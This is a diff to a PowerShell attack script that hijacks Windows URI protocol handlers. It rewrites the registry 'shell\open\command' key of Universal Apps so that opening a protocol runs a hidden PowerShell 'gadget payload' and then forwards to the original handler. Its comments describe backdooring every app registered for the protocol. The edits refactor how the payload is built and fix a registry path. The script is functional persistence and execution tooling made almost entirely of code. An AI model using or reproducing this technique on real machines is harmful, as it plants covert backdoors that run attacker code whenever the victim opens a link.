@@ -10,18 +10,26 @@ Begin {
 
     function UpdateRegistryKey($finalPayload)
     {
-        $finalPayload
         $ErrorActionPreference = "SilentlyContinue"
         Write-Host -BackgroundColor Red "Universal App to hijack:"
         Write-Host -BackgroundColor DarkGray "$appxID"
+        Write-Host -BackgroundColor Red "Payload used:"
+        Write-Host -BackgroundColor DarkGray "$finalPayload"
         New-Item -Path "HKCU:\\Software\Classes\" -name "$appxID"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\" -Name "shell"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\" -Name "open"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\open\" -Name "command"
-        Write-Host -BackgroundColor Red "Payload used:"
-        Write-Host -BackgroundColor DarkGray "$finalPayload"
         Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$finalPayload"
         Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute"
+    }
+
+    function GenerateProxyingPayload($p, $d, $g)
+    {
+        $s0 = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"')
+        $s1 = $s0.Replace('{{POWERSHELLVERSION}}', $p)
+        $s2 = $s1.Replace('{{DEFAULTHANDLER}}', "$d")
+        $s3 = $s2.Replace('{{GADGETPAYLOAD}}', "$g")
+        return $s3
     }
 }
 
@@ -42,15 +50,16 @@ Process {
             $appxID = $( Get-ItemProperty -Path "HKCU:\\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\$uriProtocol\UserChoice" -Name "ProgID" -ErrorAction Stop ).ProgId
             # get pathname of the binary of the Universal App (via ordered lookup in HKEY_CURRENT_USER and as fallback in HKLM)
             $appUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction SilentlyContinue).AppUserModelID
-            $currValue = $(Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue).'(default)'
+            $currentHandlerValue = $( Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue ).'(default)'
             if ( [string]::IsNullOrEmpty($AppUserModelID))
             {
                 $appUserModelID = (Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Application" -ErrorAction Stop).appUserModelID
-                $currValue = $(Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue).'(default)'
+                $currentHandlerValue = $( Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue ).'(default)'
             }
+            # adapt input payload to be correctly processed by Powershell
             $gadgetPayload = $gadgetPayload.Replace("''","'")
-            $currValue = $currValue.Replace('"',"'")
-            $finalPayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"').Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{DEFAULTHANDLER}}',"$currValue").Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
+            $currentHandlerValue = $currentHandlerValue.Replace('"', "'")
+            $finalPayload = GenerateProxyingPayload $powershellVersion $currentHandlerValue $gadgetPayload
             UpdateRegistryKey($finalPayload)
         }
         catch # if no explicit default app has been chosen, then lookup via 'windows.protocol' and backdoor all the Universal App IDs available for the defined URI protocol
@@ -58,7 +67,7 @@ Process {
             try
             {
                 New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR -ErrorAction SilentlyContinue
-                Set-Location "HKCR:Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction Stop
+                Set-Location "HKCR:\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction Stop
                 $appxIDs = $( Get-ChildItem . ).PSChildName
                 if ($appxIDs)
                 {
@@ -69,12 +78,13 @@ Process {
                         {
                             $appUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
                             $universalAppHandler = "'cmd.exe' /c start shell:Appsfolder\$appUserModelID"
-                            $finalPayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"').Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{DEFAULTHANDLER}}',"$universalAppHandler").Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
+                            $finalPayload = GenerateProxyingPayload $powershellVersion $universalAppHandler $gadgetPayload
                             UpdateRegistryKey($finalPayload)
                         }
-                        catch # if key does not exists yet, create it
+                        catch # if key does not exists yet, create it (in this case nothing to forward)
                         {
-                            $finalPayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c "{{GADGETPAYLOAD}}"').Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
+                            $basePayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c "{{GADGETPAYLOAD}}"')
+                            $finalPayload = $basePayload.Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
                             UpdateRegistryKey($finalPayload)
                         }
                     }
@@ -82,7 +92,7 @@ Process {
             }
             catch
             {
-                Write-Host "Please rerun the command from a clean powershell console."
+                Write-Host "Error, please make sure to run the command from a clean powershell console."
             }
         }
     }
